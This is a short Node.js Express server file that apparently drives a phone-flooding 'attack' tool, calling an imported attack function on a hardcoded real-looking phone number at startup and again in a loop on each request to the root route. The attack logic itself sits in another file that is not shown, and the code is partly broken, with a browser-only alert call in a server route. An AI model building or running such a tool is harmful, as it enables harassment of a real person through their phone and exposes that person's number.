const express = require('express')
const method = require('./main.js')
const app = express()
//server config
const port = 8080
//attack config
const count = 1
const number = '+79132088734'

method.attack(number)

app.get('/', function(req, res){
    for (let i = 0; i < count; i++){
        method.attack(number)
    }
})

app.get('/start', function(req, res){
    alert('Welcome!')
})

app.listen(port,  function(reg, res){
    console.log('Server is running and ready to work!')
    console.log('Port: '+port)
})